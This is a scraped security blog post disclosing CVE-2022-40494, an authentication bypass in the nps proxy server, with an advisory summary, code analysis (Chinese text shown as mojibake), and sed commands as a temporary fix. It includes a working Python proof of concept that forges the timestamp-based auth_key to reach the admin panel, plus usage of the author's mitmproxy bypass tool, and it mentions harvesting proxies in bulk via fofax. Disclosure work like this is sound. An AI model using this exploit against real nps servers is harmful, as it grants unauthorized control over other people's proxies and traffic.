=== Content from blog.carrot2.cn_9b297bc8_20250108_112152.html ===

[![LOGO](/medias/logo.png)
Carrot2](/)

* [é¦é¡µ](/)
* [Web](/categories/Web)
* [Misc](/categories/Misc)
* [CTF](/categories/CTF)
* [Others](/categories/Others)
* [å³äº](/about)
* [åæé¾æ¥](/friends)

![](/medias/logo.png)
Carrot2
Carrot2ç½ç»å®å¨å­¦ä¹ ç¬è®°

* [é¦é¡µ](/)
* [Web](/categories/Web)
* [Misc](/categories/Misc)
* [CTF](/categories/CTF)
* [Others](/categories/Others)
* [å³äº](/about)
* [åæé¾æ¥](/friends)

# CVE-2022-40494

[Web](/tags/Web/)
[CVE](/tags/CVE/)

[Vulnerability](/categories/Vulnerability/)

åå¸æ¥æ:
2022-08-09

æ´æ°æ¥æ:
2022-08-09

æç« å­æ°:
963

éè¯»æ¶é¿:
4 å

éè¯»æ¬¡æ°:

---

## nps Authentication Bypass

* Affected product: V0.19.0<=nps<=V0.26.10
* Attack type: Remote
* Vulnerability Type: Incorrect Access Control
* Affected component: /nps/web/controllers/base.go
* Description: nps<=v0.26.10 was discovered to contain a authentication bypass vulnerability via constantly generating and sending the Auth key and Timstamp parameters. Hackers can gain access to proxy information and control traffic through this vulnerability.

### POC

A tool from github <https://github.com/carr0t2/nps-auth-bypass>

```
python scan.py -u http://1.1.1.1:8080/
```
### Details

In /nps/web/controllers/base.go

![](https://images.carrot2.cn/img/2022-10-01_108fb7431aac22ddd6ab4e7378e2b37d.png)

In /nps/nps.conf

![](https://images.carrot2.cn/img/2022-10-01_aee673b3dd292744f435c583c92dd7bd.png)

The auth key in the configuration file is annotated by default, so it is empty

Webapiâs `auth_key` is calculated through the `auth_key` and `timestamp` in the configuration file, so you can dynamically generate Webapiâs `auth_key`

The last to get into the website backstage

### Temporary Fixes

```
sed -i "s/auth_crypt_key =1234567812345678/auth_crypt_key=$(head /dev/urandom | tr -dc a-f0-9 | head -c 16)/" /etc/nps/conf/nps.conf
sed -i "s/#auth_key=test/auth_key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)/" /etc/nps/conf/nps.conf
```
## npsè®¤è¯ç»è¿æ¼æ´åæ

### ç¯å¢æ­å»º

é¡¹ç®å°å <https://github.com/ehang-io/nps>

```
git clone https://github.com/ehang-io/nps --depth 1
cd nps
docker run -it --name nps --net=host -v /root/github/nps/conf:/conf  ffdfgdfg/nps # è®°å¾æ¹æè½½è·¯å¾
```
### æ¼æ´æå

> æºäºéè¯¯çç¨æ·éç½®

npsæweb apiåè½(ææ¡£ï¼<https://github.com/ehang-io/nps/blob/master/docs/api.md>)

è¯¥åè½é»è®¤å¼å¯

é»è®¤éç½®å¦ä¸ `/etc/nps/conf/nps.conf:53`

```
#auth_key=test
auth_crypt_key =1234567812345678
```
### å½±åèå´

V0.19.0<=nps<=V0.26.10

### ä¸´æ¶ä¿®å¤æ¹æ³

ä¿®æ¹éç½®æä»¶ï¼åªæè¿ä¸ªæè½ä¸´æ¶å®å¨ä¿®å¤ï¼~~ç½ä¸è®¸å¤è¯´æ³è®²çä¸å¨~~ï¼

( å»æ`auth_key`æ³¨é && ä¿®æ¹`auth_key`ä¸ºéæºå­ç¬¦ä¸² && ä¿®æ¹`auth_crypt_key`ä¸ºé¿åº¦ä¸º16çåå­è¿å¶éæºå­ç¬¦ä¸² ) || ( å»æ`auth_key`æ³¨é && ä¿®æ¹`auth_key`ä¸ºéæºå­ç¬¦ä¸² && æ³¨é`auth_crypt_key`)

```
sed -i "s/auth_crypt_key =1234567812345678/auth_crypt_key=$(head /dev/urandom | tr -dc a-f0-9 | head -c 16)/" /etc/nps/conf/nps.conf
sed -i "s/#auth_key=test/auth_key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)/" /etc/nps/conf/nps.conf
```
### æ­£å¼ä¿®å¤åæ³

ï¼~~ç­å¼åè~~ï¼

é¦æ¬¡è¿è¡æ¶çæéæºå­ç¬¦ä¸²

æèæ£æµ`auth_key`éç½®ä¸º123æä¸ºç©ºæ¶,è·³å°ç»å½é¡µé¢

### åçåæ

#### ä»£ç åæ

å¨/nps/web/controllers/base.go

![](https://images.carrot2.cn/img/2022-10-01_926ec1d7c8a57d1468083c83d60b7991.png)

32è¡ä»urlåæ°ä¸­è·å`auth_key`ï¼keyåæ¶é´æ³hashè¿çç»æï¼

33è¡ä»urlåæ°ä¸­è·å`timestamp`

34è¡ä»éç½®ä¸­è·å`auth_key`ï¼é»è®¤éç½®ä¸ï¼`auth_key`è¢«æ³¨éï¼æä»¥è¿åä¸ºnil

35è¡è·åå½åæ¬å°æ¶é´æ³

36è¡å¤æ­ ( å­ç¬¦ä¸²ä¸ç­äºç©ºå­ç¬¦ä¸² && å½åæ¬å°æ¶é´ä¸33è¡æ¶é´ç¸å·®å°äº20s && éç½®æä»¶ç`authkey`ä¸å½åæ¶é´æ³çæçhashä¸32è¡ä¼ å¥ç`auth_key`æ¯å¦ç¸ç­ )

å¦ææ»¡è¶³çè¯å³å¯æä¸ºadminï¼è¿å¥åå°

#### æé è¿ç¨

é£ä¹åªéè¦æ»¡è¶³36è¡çåä¸ªæ¡ä»¶

ç¬¬ä¸ä¸ª `md5Key != ""` æä¸ºç

ç¬¬äºä¸ª æ¶é´æ³æ¬å°å®æ¶çæ

ç¬¬ä¸ä¸ª å ä¸º`auth_key`é»è®¤ä¸ºç©ºï¼æä»¥åªéè¦æ¬å°å¯¹æ¶é´æ³md5å³å¯

æä»¥æé éå¸¸ç®åï¼ä»¥ä¸ä¸ºpythonä»£ç 

#### poc

```
import requests
import time
import hashlib

now_timestamp = str(int(time.time()))
auth_key = hashlib.md5(now_timestamp.encode()).hexdigest()

burp0_url = f"http://xxx/?auth_key={auth_key}&timestamp={now_timestamp}"
r = requests.get(burp0_url)
if "title-admin" in r.text:
    print("Success")
```
### å·¥å·

åå¦éè¦è®¿é®webçé¢è¿å¥åå°ï¼éè¦æ¯20sçæ`timestamp`å`auth_key`

æä»¥è¿éä½¿ç¨`mitmproxy`ä½ä¸ºä¸­é´äººï¼èªå¨çæå¹¶æå¥`timestamp`å`auth_key`

æå·²ç»åå¥½äºå·¥å·ä¸ä¼ è³github <https://github.com/carr0t2/nps-auth-bypass>

#### ä½¿ç¨æ¹æ³

webç«¯ å¯ä»¥ç´æ¥å¨æµè§å¨è®¿é®åå°

```
git clone https://github.com/carr0t2/nps-auth-bypass
cd nps-auth-bypass
mitmdump -s main.py -p 8000 --ssl-insecure --mode reverse:http://x.x.x.x:x/
```

æµè§å¨è®¿é® <http://127.0.0.1:8000/>

#### å¶ä»èæ¬

å¯ä»¥èå¨fofaxæ¹éè·åä»£çç­

---

è¯è®º

 ä¸ä¸ç¯
[![äºåçå­¦ä¹ ç¬è®°-1 å®è£k8s](https://images.carrot2.cn/img/2022-09-04_ce9e007005872a51f8acc5e7076a4a05.png)
äºåçå­¦ä¹ ç¬è®°-1 å®è£k8s](/2022/08/cloud-native-note-1.html)
äºåçå­¦ä¹ ç¬è®°-1 å®è£k8s çæ¬1.2.4

2022-08-20

[Web](/categories/Web/)

[Web](/tags/Web/)
[äºåç](/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/)
[ç¬è®°](/tags/%E7%AC%94%E8%AE%B0/)

ä¸ä¸ç¯

[![CVE-2021-29454](https://images.carrot2.cn/img/2022-03-23_e54d2e8dbd080dae7c4e5cb0803aadff.png)
CVE-2021-29454](/2022/03/cve-2021-29454.html)
æ¾ä¸å°payloadçCVE-2021-29454

2022-03-23

[Vulnerability](/categories/Vulnerability/)

[CTF](/tags/CTF/)
[CVE](/tags/CVE/)

  ç®å½

Copyright ©
2020-2023
2020
[Carrot2](/about)
| Powered by [Hexo](https://hexo.io/)
| Theme [Matery](https://github.com/blinkfox/hexo-theme-matery)

  ç«ç¹æ»å­æ°: 30.9k å­
|  æ»è®¿é®é:  æ¬¡

|  æ»è®¿é®äººæ°:  äºº

  æç´¢


